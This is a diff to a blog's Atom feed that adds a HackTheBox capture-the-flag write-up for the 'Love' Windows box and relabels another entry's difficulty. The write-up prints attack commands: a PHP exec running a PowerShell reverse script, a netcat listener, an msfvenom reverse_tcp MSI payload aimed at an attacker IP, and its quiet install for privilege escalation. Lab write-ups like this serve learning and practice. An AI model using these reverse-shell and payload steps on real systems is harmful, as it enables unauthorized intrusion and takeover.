@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator>
   <link href="/author/r3Z3l/feed.xml" rel="self" type="application/atom+xml" />
   <link href="/" rel="alternate" type="text/html" />
-  <updated>2021-08-04T13:18:59+05:30</updated>
+  <updated>2021-08-09T16:44:33+05:30</updated>
   <id>/author/r3Z3l/feed.xml</id>
 
   
@@ -32,12 +32,104 @@
 
   
     <entry>
+      <title type="html">Love Writeup</title>
+      <link href="/Love-writeup" rel="alternate" type="text/html" title="Love Writeup" />
+      <published>2021-07-02T03:30:00+05:30</published>
+      <updated>2021-07-02T03:30:00+05:30</updated>
+      <id>/Love-writeup</id>
+      <content type="html" xml:base="/Love-writeup">&lt;p&gt;Easy Windows box from HackTheBox.&lt;/p&gt;
+
+&lt;p&gt;starting with nmap scan we found many ports open but many are fake services.
+Firstly i enumerated port 80,443,5000 as they were running web services.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;#voting-exploit&lt;/p&gt;
+
+&lt;p&gt;running a voting portal on port 80.
+&lt;em&gt;Two exploits&lt;/em&gt; found for this :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Unauthenticated RCE&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Authenticated RCE&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;for-unauth-rce&quot;&gt;For Unauth RCE&lt;/h2&gt;
+&lt;p&gt;For Unauthenticated RCE we can upload powershell reverse script and execute using powershell.
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php echo exec(&quot;powershell reverse.ps1&quot;) ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;so, I get #reverse-shell.&lt;/p&gt;
+
+&lt;p&gt;Note: for me first time unauth RCE worked but then it was not working.&lt;/p&gt;
+
+&lt;h2 id=&quot;for-auth-rce&quot;&gt;For Auth RCE&lt;/h2&gt;
+&lt;p&gt;I found staging.love.htb  for port 443 nmap scan. So, let’s add it in /etc/hosts.&lt;/p&gt;
+
+&lt;p&gt;On checking https://staging.love.htb, I found that I can scan any site using this and  nmap shown port 5000 which is forbidden to us.&lt;/p&gt;
+
+&lt;p&gt;so let’s scan it.&lt;/p&gt;
+
+&lt;p&gt;I tried many ways to scan it finally i scanned port 5000 on localhost.
+we can get credentials .
+&lt;img src=&quot;assets/images/Pasted image 20210601172800.png&quot; alt=&quot;Pasted image 20210601172800.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried exploit of searchsploit but it has some things misconfigured so i corrected it.
+I’m putting that RCE &lt;a href=&quot;https://github.io/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;running listner using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rlwrap nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;so, I got reverse shell as Phoebe user and got  #user-txt  by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;For Prive esc i thought to use sharpup.exe as it show min. things
+let’s upload SharpUp.exe using creating smbserver on our machine
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-smbserver kali .&lt;/code&gt;    on kali&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy \\ip\kali\SharpUp.exe SharpUp.exe&lt;/code&gt; on windows&lt;/p&gt;
+
+&lt;p&gt;On executing, it shows that registery permission is 1.
+&lt;img src=&quot;assets/images/Pasted image 20210809160738.png&quot; alt=&quot;Pasted image 20210809160738.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This permission allows any user to execute msi file.
+So, let’s create reverse.msi using msfvenom&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows\x64\reverse_tcp LHOST=ip LPORT=4242 -f msi -o reverse.msi&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;run it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msi /quiet /qn /i reverse.msi&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and you will get reverse shell as admin&lt;/p&gt;
+
+&lt;p&gt;so, I got #root-txt  by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type root.txt&lt;/code&gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Himanshu Kumar</name>
+        
+        
+      </author>
+
+      
+
+      
+
+      
+        <summary type="html">Easy Windows box from HackTheBox.</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
       <title type="html">Ophiuchi Writeup</title>
       <link href="/Ophiuchi" rel="alternate" type="text/html" title="Ophiuchi Writeup" />
       <published>2021-07-02T01:30:00+05:30</published>
       <updated>2021-07-02T01:30:00+05:30</updated>
       <id>/Ophiuchi</id>
-      <content type="html" xml:base="/Ophiuchi">&lt;p&gt;Easy Linux box from HackTheBox.&lt;/p&gt;
+      <content type="html" xml:base="/Ophiuchi">&lt;p&gt;Medium Linux box from HackTheBox.&lt;/p&gt;
 
 &lt;p&gt;On rustscan:&lt;/p&gt;
 &lt;ul&gt;
@@ -101,7 +193,7 @@ we got #root-txt&lt;/p&gt;</content>
       
 
       
-        <summary type="html">Easy Linux box from HackTheBox.</summary>
+        <summary type="html">Medium Linux box from HackTheBox.</summary>
       
 
       
